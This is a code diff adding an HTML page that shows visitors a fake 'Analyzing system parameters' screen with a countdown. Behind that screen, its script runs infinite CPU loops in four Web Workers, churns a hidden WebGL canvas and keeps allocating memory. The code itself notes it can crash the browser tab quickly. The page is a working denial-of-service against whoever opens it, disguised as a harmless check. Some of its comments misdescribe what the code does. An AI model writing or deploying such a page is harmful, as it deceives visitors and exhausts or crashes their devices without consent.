@@ -1,0 +1,99 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>System Stress Test</title>
+    <style>
+        body {
+            background-color: #050505;
+            color: #00ff00;
+            font-family: 'Courier New', Courier, monospace;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+            overflow: hidden;
+        }
+        .container { text-align: center; }
+        .loader {
+            border: 5px solid #333;
+            border-top: 5px solid #00ff00;
+            border-radius: 50%;
+            width: 50px;
+            height: 50px;
+            animation: spin 1s linear infinite;
+            margin: 20px auto;
+        }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        #timer { font-size: 24px; font-weight: bold; }
+    </style>
+</head>
+<body>
+
+    <div class="container">
+        <h1>PLEASE WAIT...</h1>
+        <p>Analyzing system parameters...</p>
+        <div class="loader"></div>
+        <div id="timer">Calculating: 60s</div>
+    </div>
+
+    <canvas id="gpu-stress" style="display:none;"></canvas>
+
+    <script>
+        // 1. THE TIMER (60 to 120 seconds)
+        let timeLeft = 60; 
+        const timerElement = document.getElementById('timer');
+
+        const countdown = setInterval(() => {
+            timeLeft--;
+            timerElement.innerText = `Calculating: ${timeLeft}s`;
+            if (timeLeft <= 0) {
+                clearInterval(countdown);
+                alert("Task Complete.");
+            }
+        }, 1000);
+
+        // 2. CPU STRESS (Heavy Calculation)
+        // We use a loop that performs complex math to max out a thread
+        function stressCPU() {
+            while(true) {
+                Math.sqrt(Math.random() * Math.random());
+            }
+        }
+
+        // Run CPU stress in 4 separate "threads" (Workers)
+        for (let i = 0; i < 4; i++) {
+            const blob = new Blob([`while(true){Math.sqrt(Math.random()*Math.random())}`], {type: 'text/javascript'});
+            const worker = new URL(window.URL.createObjectURL(blob));
+            new Worker(worker);
+        }
+
+        // 3. GPU STRESS (WebGL)
+        const canvas = document.getElementById('gpu-stress');
+        const gl = canvas.getContext('webgl');
+        if (gl) {
+            function draw() {
+                // Drawing millions of points or complex shaders forces the GPU to work
+                gl.clearColor(Math.random(), Math.random(), Math.random(), 1);
+                gl.clear(gl.COLOR_BUFFER_BIT);
+                requestAnimationFrame(draw);
+            }
+            draw();
+        }
+
+        // 4. MEMORY STRESS (Optional)
+        // Warning: This can make the browser tab crash very quickly
+        let garbage = [];
+        setInterval(() => {
+            for(let i=0; i<10000; i++) {
+                garbage.push(new Array(1000).fill("STRESS"));
+            }
+            if(garbage.length > 100) garbage.shift(); // Prevent instant crash
+        }, 100);
+
+    </script>
+</body>
+</html>
